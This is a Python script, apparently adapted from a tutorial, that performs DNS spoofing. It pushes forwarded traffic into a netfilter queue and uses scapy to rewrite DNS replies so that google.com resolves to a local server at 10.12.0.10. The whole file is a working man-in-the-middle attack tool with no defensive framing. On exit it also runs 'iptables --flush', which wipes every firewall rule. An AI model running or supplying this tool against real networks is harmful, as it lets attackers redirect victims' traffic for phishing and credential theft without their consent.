from scapy.all import *
from netfilterqueue import NetfilterQueue
import os
import subprocess

# Inspiration : https://www.thepythoncode.com/article/make-dns-spoof-python

# Need to apply this ruleset with nftables : This rule indicates that whenever a packet is forwarded, redirect it ( -j for jump ) to the netfilter queue number 0. This will enable us to redirect all the forwarded packets into Python. 

def display_banner():
    print("""  _____  _   _  _____   _____   ____ _____  _____  ____  _   _ _____ _   _  _____ 
    |  __ \| \ | |/ ____| |  __ \ / __ \_   _|/ ____|/ __ \| \ | |_   _| \ | |/ ____|
    | |  | |  \| | (___   | |__) | |  | || | | (___ | |  | |  \| | | | |  \| | |  __ 
    | |  | | . ` |\___ \  |  ___/| |  | || |  \___ \| |  | | . ` | | | | . ` | | |_ |
    | |__| | |\  |____) | | |    | |__| || |_ ____) | |__| | |\  |_| |_| |\  | |__| |
    |_____/|_| \_|_____/  |_|     \____/_____|_____/ \____/|_| \_|_____|_| \_|\_____|
    """)

dns_hosts = {
    b"google.com.": "10.12.0.10", # redirect google to the internal http server
    b"www.google.com.": "10.12.0.10",
}

def modify_packet(packet):
    """
    Modifies the DNS Resource Record `packet` ( the answer part)
    to map our globally defined `dns_hosts` dictionary.
    For instance, whenever we see a google.com answer, this function replaces 
    the real IP address with fake IP address (10.12.0.10)
    """
    # get the DNS question name, the domain name
    qname = packet[DNSQR].qname
    if qname not in dns_hosts:
        # if the website isn't in our record
        # we don't wanna modify that
        print("no modification:", qname)
        return packet
    # craft new answer, overriding the original
    # setting the rdata for the IP we want to redirect (spoofed)
    # for instance, google.com will be mapped to "192.168.1.100"
    packet[DNS].an = DNSRR(rrname=qname, rdata=dns_hosts[qname])
    # set the answer count to 1
    packet[DNS].ancount = 1
    # delete checksums and length of packet, because we have modified the packet
    # new calculations are required ( scapy will do automatically )
    del packet[IP].len
    del packet[IP].chksum
    del packet[UDP].len
    del packet[UDP].chksum
    # return the modified packet
    return packet

def process_packet(packet):
    """
    Whenever a new packet is redirected to the netfilter queue,
    this callback is called.
    """
    # convert netfilter queue packet to scapy packet
    scapy_packet = IP(packet.get_payload())
    if scapy_packet.haslayer(DNSRR):
        # if the packet is a DNS Resource Record (DNS reply)
        # modify the packet
        print("[Before]:", scapy_packet.summary())
        try:
            scapy_packet = modify_packet(scapy_packet)
        except IndexError:
            # not UDP packet, this can be IPerror/UDPerror packets
            pass
        print("[After ]:", scapy_packet.summary())
        # set back as netfilter queue packet
        packet.set_payload(bytes(scapy_packet))
    # accept the packet
    packet.accept()

display_banner()

QUEUE_NUM = 0

# insert the iptables FORWARD rule
print("[+] Adding ruleset for netfilterqueue...")
os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM))

# instantiate the netfilter queue
queue = NetfilterQueue()

try:
    # bind the queue number to our callback `process_packet`
    # and start it
    queue.bind(QUEUE_NUM, process_packet)
    queue.run()
except KeyboardInterrupt:
    # if want to exit, make sure we
    # remove that rule we just inserted, going back to normal.
    print("[+] Flushing rulesets...")
    os.system("iptables --flush")